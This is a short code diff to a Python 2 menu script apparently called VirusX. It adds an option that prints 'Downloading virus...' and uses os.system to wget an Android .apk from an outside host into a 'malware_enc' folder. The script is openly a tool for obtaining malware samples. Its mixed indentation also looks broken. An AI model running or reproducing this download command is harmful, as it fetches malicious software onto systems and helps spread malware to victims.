@@ -143,6 +143,19 @@ def main():
 			print ""+B+"[*]"+N+"Finished"
 			print
 			main()
+ elif dr == "08":
+		dea = raw_input(""+N+"Virus"+B+"X > ")
+		if dea == "run":
+			time.sleep(1)
+			print ""+B+"[*]"+N+" Downloading virus..."
+			os.system("cd virus;mkdir malware_enc;cd malware_enc;wget http://loolzec.blogwaper.com/files/30208552a677cce35d4863d3d85b85.apk")
+			time.sleep(1)
+			print
+			print "Now check folder virus on "+R+"/VirusX/virus/malware_enc/"
+			time.sleep(1)
+			print ""+B+"[*]"+N+"Finished"
+			print
+			main()
   elif dr == "virusx update":
     print ""+G+"~ "+B+"UPDATING..."
     time.sleep(2)
